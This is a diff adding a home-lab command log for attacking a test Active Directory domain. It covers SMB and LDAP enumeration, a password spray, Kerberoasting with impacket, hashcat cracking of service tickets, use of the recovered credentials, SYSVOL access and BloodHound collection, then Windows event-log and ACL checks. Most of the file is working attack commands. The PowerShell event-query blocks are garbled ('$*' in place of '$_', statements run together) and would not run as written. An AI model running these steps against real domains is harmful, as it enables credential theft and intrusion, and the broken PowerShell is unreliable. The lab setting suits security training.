@@ -1,0 +1,144 @@
+# NETWORK CONFIGURATION / CONNECTIVITY
+ip -br addr
+ping -c 4 192.168.56.10
+nslookup home.lab 192.168.56.10
+
+# ACTIVE DIRECTORY SERVICE ENUMERATION
+nmap -Pn -sS -sV 192.168.56.10
+
+# ANONYMOUS SMB & LDAP ENUMERATION
+smbclient -L //192.168.56.10 -N
+smbclient -L //192.168.56.10 -N --option='client min protocol=SMB2'
+ldapsearch -x -H ldap://192.168.56.10 -s base -b "" namingContexts
+ldapsearch -x -H ldap://192.168.56.10 -b "DC=home,DC=lab" "(objectClass=user)" sAMAccountName
+
+# KERBEROS CONFIGURATION / AUTHENTICATION
+sudo apt install krb5-user
+sudo nmcli connection modify "Host-Only" ipv4.dns "192.168.56.10"
+sudo nmcli connection modify "Host-Only" ipv4.dns "192.168.56.10" ipv4.dns-search "~home.lab"
+sudo nmcli connection down "Host-Only" && sudo nmcli connection up "Host-Only"
+sudo nmcli connection modify "Host-Only" ipv4.dns-priority -50
+sudo nmcli connection down "Host-Only" && sudo nmcli connection up "Host-Only"
+echo "192.168.56.10 dc01.home.lab" | sudo tee -a /etc/hosts
+grep -n "dc01.home.lab" /etc/hosts
+sudo cp /etc/krb5.conf /etc/krb5.conf.lab15-backup
+sudo sed -i '/HOME.LAB = {/,/}/ s/kdc = dc01.home.lab/kdc = 192.168.56.10/' /etc/krb5.conf
+kinit [lab.user@HOME.LAB](mailto:lab.user@HOME.LAB)
+klist
+
+# LDAP GSSAPI / AUTHENTICATED ENUMERATION
+sudo apt install libsasl2-modules-gssapi-mit
+ldapsearch -Y GSSAPI -H ldap://192.168.56.10 -b "DC=home,DC=lab" "(objectClass=user)" sAMAccountName
+ldapsearch -Y GSSAPI -H ldap://192.168.56.10 -b "DC=home,DC=lab" -s base "(objectClass=*)" lockoutThreshold lockoutDuration maxPwdAge
+
+# CONTROLLED PASSWORD SPRAY
+which nxc
+printf '%s\n' lab.user lab.admin lab.service
+printf '%s\n' lab.user lab.admin lab.service > ~/ad-users.txt
+nxc smb 192.168.56.10 -u ~/ad-users.txt -p '<LAB_USER_PASSWORD>' --continue-on-success
+
+# SPN ENUMERATION
+ldapsearch -Y GSSAPI -H ldap://192.168.56.10 -b "DC=home,DC=lab" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+
+# LAB SPN CONFIGURATION - DC01
+Get-ADUser lab.service -Properties ServicePrincipalName |
+    Select-Object SamAccountName, ServicePrincipalName
+setspn -s HTTP/labservice.home.lab lab.service
+Get-ADUser lab.service -Properties ServicePrincipalName |
+    Select-Object SamAccountName, ServicePrincipalName
+
+# KERBEROASTING
+ls -l /tmp/krb5cc_1000
+export KRB5CCNAME=/tmp/krb5cc_1000
+klist
+KRB5CCNAME=/tmp/krb5cc_1000 impacket-GetUserSPNs -k -no-pass -dc-ip 192.168.56.10 -request -outputfile ~/lab15-kerberoast.txt home.lab/lab.user
+head -n 3 ~/lab15-kerberoast.txt
+
+# HASHCAT / OFFLINE PASSWORD RECOVERY
+printf '%s\n' '<LAB_SERVICE_PASSWORD>' > ~/lab15-passwords.txt
+hashcat -m 13100 ~/lab15-kerberoast.txt ~/lab15-passwords.txt
+hashcat -I
+RUSTICL_ENABLE=llvmpipe clinfo
+RUSTICL_ENABLE=llvmpipe hashcat -I
+RUSTICL_ENABLE=llvmpipe hashcat -m 13100 ~/lab15-kerberoast.txt ~/lab15-passwords.txt
+
+# RECOVERED CREDENTIAL VALIDATION
+ldapwhoami -x -H ldap://192.168.56.10 -D "[lab.service@home.lab](mailto:lab.service@home.lab)" -W
+ldapsearch -x -H ldap://192.168.56.10 -D "[lab.service@home.lab](mailto:lab.service@home.lab)" -W -b "DC=home,DC=lab" "(sAMAccountName=lab.service)" memberOf primaryGroupID
+nxc smb 192.168.56.10 -u 'lab.service' -p '<RECOVERED_LAB_SERVICE_PASSWORD>'
+nxc smb 192.168.56.10 -u 'lab.service' -p '<RECOVERED_LAB_SERVICE_PASSWORD>' --shares
+
+# SYSVOL ACCESS
+smbclient //192.168.56.10/SYSVOL -U 'HOME\lab.service'
+Inside smbclient:
+    get Registry.pol /home/hacker/lab15-Registry.pol
+file /home/hacker/lab15-Registry.pol
+strings /home/hacker/lab15-Registry.pol
+
+# BLOODHOUND
+which bloodhound
+sudo apt install bloodhound
+bloodhound --help
+bloodhound-start
+/usr/share/neo4j/bin/cypher-shell -u neo4j -p '<NEO4J_PASSWORD>' "RETURN 1;"
+bloodhound-python -c DCOnly -d home.lab -u 'lab.service' -p '<LAB_SERVICE_PASSWORD>' -ns 192.168.56.10 -dc dc01.home.lab --zip
+
+# WINDOWS SECURITY EVENT VALIDATION
+Get-Date
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    Id      = 4624,4625
+    } -MaxEvents 5 | Select-Object TimeCreated, Id
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    Id      = 4624,4625
+    } -MaxEvents 20 | ForEach-Object {$xml = [xml]$*.ToXml() [PSCustomObject]@{
+        TimeCreated = $*.TimeCreated
+        EventID = $*.Id
+        TargetUser = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetUserName'}).'#text'
+        TargetDomain = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetDomainName'}).'#text'
+        LogonType = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'LogonType'}).'#text'
+        IpAddress = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'IpAddress'}).'#text'
+        Workstation = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'WorkstationName'}).'#text'
+        }} | Where-Object {$_.TargetUser -in @('lab.user','lab.admin','lab.service')} | Format-Table -AutoSize
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    Id      = 4624,4625
+    } -MaxEvents 30 | ForEach-Object {$xml = [xml]$*.ToXml() [PSCustomObject]@{
+        TimeCreated = $*.TimeCreated
+        EventID = $*.Id
+        TargetUser = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetUserName'}).'#text'
+        TargetDomain = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetDomainName'}).'#text'
+        LogonType = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'LogonType'}).'#text'
+        IpAddress = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'IpAddress'}).'#text'
+        Workstation = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'WorkstationName'}).'#text'
+        }} | Where-Object {$_.TargetUser -eq 'lab.service'} | Format-Table -AutoSize
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    Id      = 4624,4625
+    } -MaxEvents 100 | ForEach-Object {$xml = [xml]$*.ToXml() [PSCustomObject]@{
+        TimeCreated = $*.TimeCreated
+        EventID = $*.Id
+        TargetUser = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetUserName'}).'#text'
+        LogonType = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'LogonType'}).'#text'
+        IpAddress = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'IpAddress'}).'#text'
+        }} | Where-Object {$*.IpAddress -eq '192.168.56.40' -and $*.LogonType -eq '3'} | Format-Table -AutoSize
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'
+    Id      = 4769
+    } -MaxEvents 30 | ForEach-Object {$xml = [xml]$*.ToXml() [PSCustomObject]@{
+        TimeCreated = $*.TimeCreated
+        EventID = $*.Id
+        AccountName = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TargetUserName'}).'#text'
+        ServiceName = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'ServiceName'}).'#text'
+        ClientAddress = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'IpAddress'}).'#text'
+        TicketEncryption = ($xml.Event.EventData.Data | Where-Object {$*.Name -eq 'TicketEncryptionType'}).'#text'
+        }} | Where-Object {$*.AccountName -eq 'lab.user'} | Format-Table -AutoSize
+
+# ACTIVE DIRECTORY ACL / DELEGATION VALIDATION
+Import-Module ActiveDirectory
+Get-PSDrive AD
+
+Get-Acl "AD:\OU=Lab Users,DC=home,DC=lab" | Select-Object -ExpandProperty Access | Where-Object {
+    $*.IdentityReference -like "*Lab-IT-Admins*" -and $*.ActiveDirectoryRights -match "ExtendedRight"
+    } | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, ObjectType, InheritanceType
